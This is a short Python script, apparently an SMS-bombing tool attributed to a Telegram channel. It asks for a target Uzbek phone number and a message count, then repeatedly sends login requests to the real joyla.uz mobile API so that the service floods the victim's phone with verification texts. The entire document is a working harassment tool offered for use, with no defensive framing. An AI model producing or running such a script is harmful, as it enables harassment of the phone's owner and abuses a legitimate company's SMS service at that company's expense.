import requests

#Telegram @CyberKnightuz

def login(username):
    url = 'https://mobile-api.joyla.uz/mobile/api/auth/login'
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Origin': 'https://joyla.uz',
        'Referer': 'https://joyla.uz/',
        'Connection': 'close',
    }
    payload = {
        'username': '+998{}'.format(username)
    }

#Telegram @CyberKnightuz

    response = requests.post(url, headers=headers, json=payload)
    if response.status_code == 200:
        print("SMS yuborildi => ", username)
    else:
        print("Login failed for", username)

def main():
    phone_number = input("Telefon raqamingizni kiriting (masalan: 901234567): ")
    sms_count = int(input("Nechta SMS yuborasiz: "))
    for _ in range(sms_count):
        login(phone_number)
        
#Telegram @CyberKnightuz
        
if __name__ == "__main__":
    main()
